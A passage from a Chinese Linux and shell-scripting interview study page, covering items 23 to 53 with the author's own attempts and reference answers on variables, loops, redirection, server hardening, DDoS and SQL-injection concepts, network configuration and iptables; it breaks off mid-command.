id="23-在-Shell-脚本中，如何写入注释？"><a href="#23-在-Shell-脚本中，如何写入注释？" class="headerlink" title="23.在 Shell 脚本中，如何写入注释？"></a>23.在 Shell 脚本中，如何写入注释？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>使用<code>#</code>号做注释符合，<code>#</code>所在行后面的字符将作为注释。</p><p><font style="background-color:#e91e64">答案</font></p><p>注释可以用来描述一个脚本可以做什么和它是如何工作的。每一行注释以 <code>#</code> 开头。例子如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is a <span class="built_in">command</span></span></span><br><span class="line">echo “I am logged in as $USER”</span><br></pre></td></tr></table></figure><h2 id="24-可以在-Shell-脚本中使用哪些类型的变量？"><a href="#24-可以在-Shell-脚本中使用哪些类型的变量？" class="headerlink" title="24.可以在 Shell 脚本中使用哪些类型的变量？"></a>24.可以在 Shell 脚本中使用哪些类型的变量？</h2><p><font style="background-color: #8bc34a">作答</font></p><ol><li>数字类型</li><li>字符类型</li></ol><p><font style="background-color:#e91e64">答案</font></p><p>在 Shell 脚本，我们可以使用两种类型的变量：</p><ul><li><p>系统定义变量</p><blockquote><p>系统变量是由系统系统自己创建的。这些变量通常由大写字母组成，可以通过 <code>set</code> 命令查看。</p></blockquote></li><li><p>用户定义变量</p><blockquote><p>用户变量由系统用户来生成和定义，变量的值可以通过命令 <code>&quot;&quot;echo $&lt;变量名&gt;&quot;&quot;</code> 查看。</p></blockquote></li></ul><h2 id="25-Shell脚本中-标记的用途是什么？"><a href="#25-Shell脚本中-标记的用途是什么？" class="headerlink" title="25.Shell脚本中 $? 标记的用途是什么？"></a>25.Shell脚本中 $? 标记的用途是什么？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><code>$?</code>能够获取上一个逻辑判断语句的结果。</p><p><font style="background-color:#e91e64">答案</font></p><p>在写一个 Shell 脚本时，如果你想要检查前一命令是否执行成功，在 <code>if</code> 条件中使用 <code>$?</code> 可以来检查前一命令的结束状态。</p><ul><li><p>如果结束状态是 0 ，说明前一个命令执行成功。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# ls /usr/bin/shar</span><br><span class="line">/usr/bin/shar</span><br><span class="line">root@localhost:~# echo $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure></li><li><p>如果结束状态不是0，说明命令执行失败。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# ls /usr/bin/share</span><br><span class="line">ls: cannot access /usr/bin/share: No such file or directory</span><br><span class="line">root@localhost:~# echo $?</span><br><span class="line">2</span><br></pre></td></tr></table></figure></li></ul><h2 id="26-Bourne-Shell-bash-中有哪些特殊的变量？"><a href="#26-Bourne-Shell-bash-中有哪些特殊的变量？" class="headerlink" title="26. Bourne Shell(bash) 中有哪些特殊的变量？"></a>26. Bourne Shell(bash) 中有哪些特殊的变量？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>下面的表列出了 Bourne Shell 为命令行设置的特殊变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">内建变量    解释</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0    命令行中的脚本名字</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1    第一个命令行参数</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2    第二个命令行参数</span></span><br><span class="line">…..    …….</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">9    第九个命令行参数</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="comment">#    命令行参数的数量</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">*    所有命令行参数，以空格隔开</span></span><br></pre></td></tr></table></figure><h2 id="27-如何取消变量或取消变量赋值？"><a href="#27-如何取消变量或取消变量赋值？" class="headerlink" title="27.如何取消变量或取消变量赋值？"></a>27.如何取消变量或取消变量赋值？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p><code>unset</code> 命令用于取消变量或取消变量赋值。语法如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">unset</span> &lt;变量名&gt;</span></span><br></pre></td></tr></table></figure><h2 id="28-Shell-脚本中-if-语法如何嵌套？"><a href="#28-Shell-脚本中-if-语法如何嵌套？" class="headerlink" title="28.Shell 脚本中 if 语法如何嵌套？"></a>28.Shell 脚本中 if 语法如何嵌套？</h2><p><font style="background-color: #8bc34a">作答</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if [&#x27;&#x27;=&#x27;&#x27;];then</span><br><span class="line">if [];then</span><br><span class="line">if</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><font style="background-color:#e91e64">答案</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if [ 条件 ]</span><br><span class="line">then</span><br><span class="line">命令1</span><br><span class="line">命令2</span><br><span class="line">……</span><br><span class="line">else</span><br><span class="line">if [ 条件 ]</span><br><span class="line">then</span><br><span class="line">命令1</span><br><span class="line">命令2</span><br><span class="line">….</span><br><span class="line">else</span><br><span class="line">命令1</span><br><span class="line">命令2</span><br><span class="line">……</span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="29-在-Shell-脚本中如何比较两个数字？"><a href="#29-在-Shell-脚本中如何比较两个数字？" class="headerlink" title="29.在 Shell 脚本中如何比较两个数字？"></a>29.在 Shell 脚本中如何比较两个数字？</h2><p><font style="background-color: #8bc34a">作答</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ 1 &lt; 2];then</span><br><span class="line">  echo &quot;1比2小&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><font style="background-color:#e91e64">答案</font></p><p>在 <code>if-then</code> 中使用测试命令（ <code>-gt</code> 等）来比较两个数字。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">x=10</span><br><span class="line">y=20</span><br><span class="line">if [ $x -gt $y ]</span><br><span class="line">then</span><br><span class="line">echo “x is greater than y”</span><br><span class="line">else</span><br><span class="line">echo “y is greater than x”</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="30-Shell-脚本中-case-语句的语法？"><a href="#30-Shell-脚本中-case-语句的语法？" class="headerlink" title="30.Shell 脚本中 case 语句的语法？"></a>30.Shell 脚本中 case 语句的语法？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>基础语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">case 值 in</span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h2 id="31-Shell-脚本中-for-循环语法？"><a href="#31-Shell-脚本中-for-循环语法？" class="headerlink" title="31. Shell 脚本中 for 循环语法？"></a>31. Shell 脚本中 for 循环语法？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>与其他编程语言类似，Shell支持for循环。</p><p>for循环一般格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for var in item1 item2 ... itemN</span><br><span class="line">do</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>写成一行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for var in item1 item2 ... itemN; do command1; command2… done;</span><br></pre></td></tr></table></figure><p>当变量值在列表里，for 循环即执行一次所有命令，使用变量名获取列表中的当前取值。命令可为任何有效的 shell 命令和语句。in 列表可以包含替换、字符串和文件名。</p><p>in列表是可选的，如果不用它，for循环使用命令行的位置参数。</p><p>例如，顺序输出当前列表中的数字：</p><p>实例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for loop i 1 2 3 4 5</span><br><span class="line">do</span><br><span class="line">  echo &quot;The value is: $loop&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The value is: 1</span><br><span class="line">The value is: 2</span><br><span class="line">The value is: 3</span><br><span class="line">The value is: 4</span><br><span class="line">The value is: 5</span><br></pre></td></tr></table></figure><p>顺序输出字符串中的字符：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">for str in This is a string</span><br><span class="line">do</span><br><span class="line">    echo $str</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This</span><br><span class="line">is</span><br><span class="line">a</span><br><span class="line">string</span><br></pre></td></tr></table></figure><h2 id="32-Shell-脚本中-while-循环语法？"><a href="#32-Shell-脚本中-while-循环语法？" class="headerlink" title="32.Shell 脚本中 while 循环语法？"></a>32.Shell 脚本中 while 循环语法？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>while 循环用于不断执行一系列命令，也用于从输入文件中读取数据。其语法格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="33-do-while-语句的基本格式？"><a href="#33-do-while-语句的基本格式？" class="headerlink" title="33. do-while 语句的基本格式？"></a>33. do-while 语句的基本格式？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p><code>do-while</code> 语句类似于 <code>while</code> 语句，但检查条件语句之前先执行命令（LCTT 译注：意即至少执行一次。）。下面是用 <code>do-while</code> 语句的语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">命令</span><br><span class="line">&#125; while (条件)</span><br></pre></td></tr></table></figure><h2 id="34-Shell-脚本中-break-命令的作用？"><a href="#34-Shell-脚本中-break-命令的作用？" class="headerlink" title="34.Shell 脚本中 break 命令的作用？"></a>34.Shell 脚本中 break 命令的作用？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>退出循环、退出流程控制</p><p><font style="background-color:#e91e64">答案</font></p><p><code>break</code> 命令一个简单的用途是退出执行中的循环。我们可以在 <code>while</code> 和 <code>until</code> 循环中使用 <code>break</code> 命令跳出循环。</p><h2 id="35-Shell-脚本中-continue-命令的作用？"><a href="#35-Shell-脚本中-continue-命令的作用？" class="headerlink" title="35.Shell 脚本中 continue 命令的作用？"></a>35.Shell 脚本中 continue 命令的作用？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p><code>continue</code> 命令不同于 <code>break</code> 命令，它只跳出当前循环的迭代，而不是整个循环。<code>continue</code> 命令很多时候是很有用的，例如错误发生，但我们依然希望继续执行大循环的时候。</p><h2 id="36-如何使脚本可执行？"><a href="#36-如何使脚本可执行？" class="headerlink" title="36.如何使脚本可执行？"></a>36.如何使脚本可执行？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><code>chmod +x 文件路径</code>添加可执行权限，或者使用<code>bash 脚本文件</code>直接执行</p><p><font style="background-color:#e91e64">答案</font></p><h2 id="37-bin-bash-的作用？"><a href="#37-bin-bash-的作用？" class="headerlink" title="37. #!/bin/bash 的作用？"></a>37. #!/bin/bash 的作用？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>脚本首行添加，指定执行脚本的程序。同样适用于python。</p><p>使用<code>chmod</code>添加可执行权限，可以直接通过<code>./文件名</code>执行脚本。</p><p><font style="background-color:#e91e64">答案</font></p><p><code>#!/bin/bash</code> 是 Shell 脚本的第一行，称为释伴（shebang）行。</p><ul><li>这里 <code>#</code> 符号叫做 hash ，而 <code>!</code> 叫做 bang。</li><li>它的意思是命令通过 <code>/bin/bash</code> 来执行。</li></ul><h2 id="38-如何调试-Shell脚本？"><a href="#38-如何调试-Shell脚本？" class="headerlink" title="38.如何调试 Shell脚本？"></a>38.如何调试 Shell脚本？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><ul><li><p>使用 <code>-x&#39;</code> 数（<code>sh -x myscript.sh</code>）可以调试 Shell脚本。</p></li><li><p>另一个种方法是使用 <code>-nv</code> 参数(<code>sh -nv myscript.sh</code>)。</p></li></ul><h2 id="⭐39-如何将标准输出和错误输出同时重定向到同一位置"><a href="#⭐39-如何将标准输出和错误输出同时重定向到同一位置" class="headerlink" title="⭐39.如何将标准输出和错误输出同时重定向到同一位置?"></a>⭐39.如何将标准输出和错误输出同时重定向到同一位置?</h2><p><font style="background-color: #8bc34a">作答</font></p><p><code>bash xxx.sh 2&gt;&amp;1 &gt;&gt; xxx.log</code></p><p><font style="background-color:#e91e64">答案</font></p><ul><li><p>方法一：<code>2&gt;&amp;1 (如# ls /usr/share/doc &gt; out.txt 2&gt;&amp;1 )</code> 。</p></li><li><p>方法二：<code>&amp;&gt; (如# ls /usr/share/doc &amp;&gt; out.txt )</code> 。</p></li></ul><h2 id="40-在-Shell-脚本中，如何测试文件？"><a href="#40-在-Shell-脚本中，如何测试文件？" class="headerlink" title="40.在 Shell 脚本中，如何测试文件？"></a>40.在 Shell 脚本中，如何测试文件？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>test 命令可以用来测试文件。基础用法如下表格：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Test         用法</span><br><span class="line">-d 文件名    如果文件存在并且是目录，返回true</span><br><span class="line">-e 文件名    如果文件存在，返回true</span><br><span class="line">-f 文件名    如果文件存在并且是普通文件，返回true</span><br><span class="line">-r 文件名    如果文件存在并可读，返回true</span><br><span class="line">-s 文件名    如果文件存在并且不为空，返回true</span><br><span class="line">-w 文件名    如果文件存在并可写，返回true</span><br><span class="line">-x 文件名    如果文件存在并可执行，返回true</span><br></pre></td></tr></table></figure><h2 id="41-在-Shell-脚本如何定义函数呢？"><a href="#41-在-Shell-脚本如何定义函数呢？" class="headerlink" title="41. 在 Shell 脚本如何定义函数呢？"></a>41. 在 Shell 脚本如何定义函数呢？</h2><p><font style="background-color: #8bc34a">作答</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数名()&#123;</span><br><span class="line">echo &#x27;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="background-color:#e91e64">答案</font></p><p>函数是拥有名字的代码块。当我们定义代码块，我们就可以在我们的脚本调用函数名字，该块就会被执行。示例如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="function"><span class="title">diskusage</span></span> () &#123; <span class="built_in">df</span> -h ; &#125;</span></span><br><span class="line">译注：下面是我给的shell函数语法，原文没有</span><br><span class="line">[ function ] 函数名 [()]</span><br><span class="line">&#123;</span><br><span class="line">命令;</span><br><span class="line">[return int;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="⭐42-如何让-Shell-就脚本得到来自终端的输入"><a href="#⭐42-如何让-Shell-就脚本得到来自终端的输入" class="headerlink" title="⭐42. 如何让 Shell 就脚本得到来自终端的输入?"></a>⭐42. 如何让 Shell 就脚本得到来自终端的输入?</h2><p><font style="background-color: #8bc34a">作答</font></p><p><code>read</code>命令</p><p><font style="background-color:#e91e64">答案</font></p><p>read 命令可以读取来自终端（使用键盘）的数据。read 命令得到用户的输入并置于你给出的变量中。例子如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vi /tmp/test.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo ‘Please enter your name’</span><br><span class="line">read name</span><br><span class="line">echo “My Name is $name”</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./test.sh</span></span><br><span class="line">Please enter your name</span><br><span class="line">LinuxTechi</span><br><span class="line">My Name is LinuxTechi</span><br></pre></td></tr></table></figure><h2 id="⭐43-如何执行算术运算？"><a href="#⭐43-如何执行算术运算？" class="headerlink" title="⭐43.如何执行算术运算？"></a>⭐43.如何执行算术运算？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><code>+ - * / %</code></p><p><font style="background-color:#e91e64">答案</font></p><p>有两种方法来执行算术运算：</p><ul><li>1、使用 expr 命令：<code># expr 5 + 2</code> 。</li><li>2、用一个美元符号和方括号（<code>$[ 表达式 ]</code>）：<code>test=$[16 + 4] ; test=$[16 + 4]</code> 。</li></ul><h2 id="⭐44-一台-Linux-系统初始化环境后需要做一些什么安全工作？"><a href="#⭐44-一台-Linux-系统初始化环境后需要做一些什么安全工作？" class="headerlink" title="⭐44.一台 Linux 系统初始化环境后需要做一些什么安全工作？"></a>⭐44.一台 Linux 系统初始化环境后需要做一些什么安全工作？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>配置防火墙<code>iptables</code>、<code>firewalld</code></p><p><font style="background-color:#e91e64">答案</font></p><ul><li><p>1、添加普通用户登陆，禁止 root 用户登陆，更改 SSH 端口号。</p></li><li><p>2、服务器使用密钥登陆，禁止密码登陆。</p></li><li><p>3、开启防火墙，关闭 SElinux ，根据业务需求设置相应的防火墙规则。</p></li><li><p>4、装 fail2ban 这种防止 SSH 暴力破击的软件。</p></li><li><p>5、设置只允许公司办公网出口 IP 能登陆服务器(看公司实际需要)</p></li><li><p>6、修改历史命令记录的条数为 10 条。</p></li><li><p>7、只允许有需要的服务器可以访问外网，其它全部禁止。</p></li><li><p>8、做好软件层面的防护。</p><ul><li><p>8.1 设置 nginx_waf 模块防止 SQL 注入。</p></li><li><p>8.2 把 Web 服务使用 www 用户启动，更改网站目录的所有者和所属组为 www 。</p></li></ul></li></ul><h2 id="45-什么叫-CC-攻击？什么叫-DDOS-攻击？"><a href="#45-什么叫-CC-攻击？什么叫-DDOS-攻击？" class="headerlink" title="45.什么叫 CC 攻击？什么叫 DDOS 攻击？"></a>45.什么叫 CC 攻击？什么叫 DDOS 攻击？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><ul><li>CC 攻击，主要是用来攻击页面的，模拟多个用户不停的对你的页面进行访问，从而使你的系统资源消耗殆尽。</li><li>DDOS 攻击，中文名叫分布式拒绝服务攻击，指借助服务器技术将多个计算机联合起来作为攻击平台，来对一个或多个目标发动 DDOS 攻击。</li></ul><h2 id="⭐46-怎么预防-CC-攻击和-DDOS-攻击？"><a href="#⭐46-怎么预防-CC-攻击和-DDOS-攻击？" class="headerlink" title="⭐46.怎么预防 CC 攻击和 DDOS 攻击？"></a>⭐46.怎么预防 CC 攻击和 DDOS 攻击？</h2><p><font style="background-color: #8bc34a">作答</font></p><ol><li>使用高防IP服务，购买ISP的防御流量。</li><li>配置CDN资源分发。</li><li>iptables在链路层做一些IP封禁的定时脚本（可能误杀用户，控制可接受的范围即可）。</li><li>cloudflare的DNS自带cdn真实IP隐藏</li><li>waf（听说过，不了解）</li></ol><p><font style="background-color:#e91e64">答案</font></p><p>防 CC、DDOS 攻击，这些只能是用硬件防火墙做流量清洗，将攻击流量引入黑洞。</p><blockquote><p>流量清洗这一块，主要是买 ISP 服务商的防攻击的服务就可以，机房一般有空余流量，我们一般是买服务，毕竟攻击不会是持续长时间。</p><p>例如说，<a href="https://cn.aliyun.com/product/ddos">《阿里云 —— DDoS 高防IP》</a> 。</p></blockquote><h2 id="⭐47-什么是网站数据库注入？"><a href="#⭐47-什么是网站数据库注入？" class="headerlink" title="⭐47.什么是网站数据库注入？"></a>⭐47.什么是网站数据库注入？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>SQL注入，一种网站攻击。还有XSS攻击</p><p>通过web网站的前端输入框或者api接口传入SQL语句，直接操作数据库，达到攻击行为。</p><p>预防方案：</p><ol><li>使用成熟的ORM框架，防注入。</li><li>在前端进行正则审计，过滤sql语句。</li><li>后端不通过传入的字符直接构造sql语句，使用预先构造并编译的sql语句，预防注入。</li></ol><p><font style="background-color:#e91e64">答案</font></p><ul><li>由于程序员的水平及经验参差不齐，大部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断。</li><li>应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的 SQL 注入。</li><li>SQL注入，是从正常的 WWW 端口访问，而且表面看起来跟一般的 Web 页面访问没什么区别，如果管理员没查看日志的习惯，可能被入侵很长时间都不会发觉。</li></ul><h2 id="48-如何过滤与预防？"><a href="#48-如何过滤与预防？" class="headerlink" title="48.如何过滤与预防？"></a>48.如何过滤与预防？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>参考 <a href="#%E2%AD%9047.%E4%BB%80%E4%B9%88%E6%98%AF%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%EF%BC%9F">37</a></p><p><font style="background-color:#e91e64">答案</font></p><p>数据库网页端注入这种，可以考虑使用 nginx_waf 做过滤与预防。</p><h2 id="49-如何配置静态-IP-？"><a href="#49-如何配置静态-IP-？" class="headerlink" title="49.如何配置静态 IP ？"></a>49.如何配置静态 IP ？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试服务器OS: Centos 6.5 x64</span><br><span class="line">本机OS: Ubuntu 14.04 x64</span><br></pre></td></tr></table></figure><p>由于Virtualbox当时安装Centos 6.5的时候设置的是自动获取的IP，所以局域网内每次启动，IP有时候会变化<br>如果本地测试最好固定静态IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用户root登陆到服务器，编辑配置信息</span></span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure><p>设置如下内容，有则改之，无则添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEVICE=eth0</span><br><span class="line">BOOTPROT=static</span><br><span class="line">IPADDR=192.168.1.200</span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">ONBOOT=yes</span><br></pre></td></tr></table></figure><p>之后保存<br>然后重启网卡即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>现在试试吧，IP已经变为192.168.1.200<br>直接远程登陆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.200</span><br></pre></td></tr></table></figure><h2 id="50-设置-DNS-需要修改哪个配置文件？"><a href="#50-设置-DNS-需要修改哪个配置文件？" class="headerlink" title="50.设置 DNS 需要修改哪个配置文件？"></a>50.设置 DNS 需要修改哪个配置文件？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><code>/etc/hosts</code></p><p><font style="background-color:#e91e64">答案</font></p><p>全局的配置，可以在 <code>/etc/resolv.conf</code> 文件中配置。</p><p>指定网卡的配置，可以在 <code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> 文件中配置。</p><p>一般来说，肯定是全局配置即可。</p><h2 id="51-etc-hosts-文件什么做用？"><a href="#51-etc-hosts-文件什么做用？" class="headerlink" title="51./etc/hosts 文件什么做用？"></a>51./etc/hosts 文件什么做用？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>配置本地的域名和IP的映射关系，当网络请求，需要dns解析域名的时候，会优先使用该配置的IP地址。</p><p><font style="background-color:#e91e64">答案</font></p><p>在 <code>/etc/hosts</code> 文中，我们可以配置指定域名和 IP 的映射关系。详细的，可以看看 <a href="https://www.jianshu.com/p/476a92a39b45">《Linux环境下 /etc/hosts 文件详解》</a> 文章。</p><h2 id="52-在-Linux-下如何指定dns服务器，来解析某个域名？"><a href="#52-在-Linux-下如何指定dns服务器，来解析某个域名？" class="headerlink" title="52. 在 Linux 下如何指定dns服务器，来解析某个域名？"></a>52. 在 Linux 下如何指定dns服务器，来解析某个域名？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>使用 dig 命令：<code>dig @DNSip http://domain.com</code> 。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 www.baidu.com # 使用谷歌 DNS 解析百度</span><br></pre></td></tr></table></figure><h2 id="53-iptables-命令？"><a href="#53-iptables-命令？" class="headerlink" title="53.iptables 命令？"></a>53.iptables 命令？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>iptables ，是一个配置 Linux 内核防火墙的命令行工具。功能非常强大，对于我们开发来说，主要掌握如何开放端口即可。例如：</p><ul><li><p>把来源 IP 为 192.168.1.101 访问本机 80 端口的包直接拒绝：<code>iptables -I INPUT -s 192.168.1.101 -p tcp --dport 80 -j REJECT</code> 。</p></li><li><p>开启 80 端口，因为web对外都是这个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j 